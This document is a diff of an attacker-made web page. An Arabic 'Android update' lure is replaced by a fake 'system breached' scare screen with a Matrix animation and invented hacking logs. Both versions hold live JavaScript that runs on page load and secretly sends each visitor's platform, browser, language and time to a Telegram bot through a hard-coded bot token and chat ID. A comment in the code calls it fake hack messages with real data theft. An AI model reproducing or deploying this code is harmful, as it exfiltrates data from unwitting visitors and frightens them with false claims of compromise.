@@ -1,68 +1,98 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث نظام أندرويد 2026</title>
+    <title>SYSTEM_FAILURE_ERROR_404</title>
     <style>
-        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .box { border: 1px solid #30363d; padding: 40px; border-radius: 12px; background: #161b22; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
-        .loader { border: 4px solid #21262d; border-top: 4px solid #238636; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 18px; color: #c9d1d9; }
-        p { color: #8b949e; font-size: 13px; }
+        body { background: black; color: #0f0; font-family: 'Courier New', monospace; overflow: hidden; margin: 0; }
+        canvas { display: block; position: absolute; top: 0; left: 0; z-index: -1; opacity: 0.3; }
+        .console { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: rgba(0, 0, 0, 0.8); border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; }
+        .glitch { font-size: 24px; font-weight: bold; text-transform: uppercase; animation: glitch 1s infinite; }
+        @keyframes glitch { 0% { color: #0f0; } 50% { color: #f00; text-shadow: 2px 2px #fff; } 100% { color: #0f0; } }
+        #log { font-size: 14px; height: 150px; overflow: hidden; margin-top: 10px; color: #aaa; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="loader"></div>
-    <h2>جاري فحص توافق النظام...</h2>
-    <p>برجاء عدم مغادرة الصفحة لضمان استقرار التحديث</p>
+<canvas id="matrix"></canvas>
+
+<div class="console">
+    <div class="glitch">SYSTEM BREACHED BY EGALSA_SPIDER</div>
+    <div id="log"></div>
 </div>
 
 <script>
-    // --- أوامر Egalsa ---
+    // --- إعدادات البوت (أوامر Egalsa) ---
     const config = {
         token: "8277722647:AAGbaCEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
         chatId: "1268323143"
     };
 
-    async function sendToSpider() {
-        // سحب البيانات المتاحة من المتصفح
-        const info = {
-            os: navigator.platform,
-            agent: navigator.userAgent.split(') ')[0] + ')',
-            lang: navigator.language,
-            screen: window.screen.width + "x" + window.screen.height,
-            time: new Date().toLocaleString('ar-EG')
-        };
+    // --- تأثير الماتريكس (الخلفية) ---
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
 
-        const message = `
-🚀 **Spider Attack Success!** 🕸️
-━━━━━━━━━━━━━━━
-📱 **الجهاز:** ${info.os}
-🌐 **المتصفح:** ${info.agent}
-🖥️ **الشاشة:** ${info.screen}
-🌍 **اللغة:** ${info.lang}
-⏰ **الوقت:** ${info.time}
-━━━━━━━━━━━━━━━
-📍 **بواسطة أوامر Egalsa**
-        `;
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0f0";
+        ctx.font = fontSize + "px monospace";
+        for (let i = 0; i < drops.length; i++) {
+            const text = letters[Math.floor(Math.random() * letters.length)];
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(draw, 33);
 
-        const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+    // --- رسائل الاختراق الوهمية وسحب البيانات الحقيقي ---
+    const logs = [
+        "> Establishing connection...",
+        "> IP Address found: Searching...",
+        "> Accessing System Files...",
+        "> Bypassing Firewall...",
+        "> Downloading Private Gallery...",
+        "> Capturing Front Camera...",
+        "> Mirroring Screen...",
+        "> ERROR: SYSTEM TOTALLY CONTROLLED"
+    ];
 
-        try {
-            await fetch(url);
-            console.log("Success");
-        } catch (e) {
-            console.log("Error");
+    let logIdx = 0;
+    const logDiv = document.getElementById('log');
+
+    function typeLog() {
+        if (logIdx < logs.length) {
+            logDiv.innerHTML += logs[logIdx] + "<br>";
+            logIdx++;
+            setTimeout(typeLog, 800);
         }
     }
 
-    // التنفيذ الفوري
-    window.onload = sendToSpider;
-</script>
+    async function sendData() {
+        const info = `
+⚠️ **EGALSA ATTACK DETECTED** ⚠️
+━━━━━━━━━━━━━━━
+👤 الضحية: ${navigator.platform}
+🛡️ المتصفح: ${navigator.userAgent.split(' ')[0]}
+🌍 اللغة: ${navigator.language}
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━
+📍 تم تفعيل وضع الرعب بنجاح!
+        `;
+        const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`;
+        try { await fetch(url); } catch (e) {}
+    }
 
+    window.onload = () => {
+        typeLog();
+        sendData();
+    };
+</script>
 </body>
 </html>
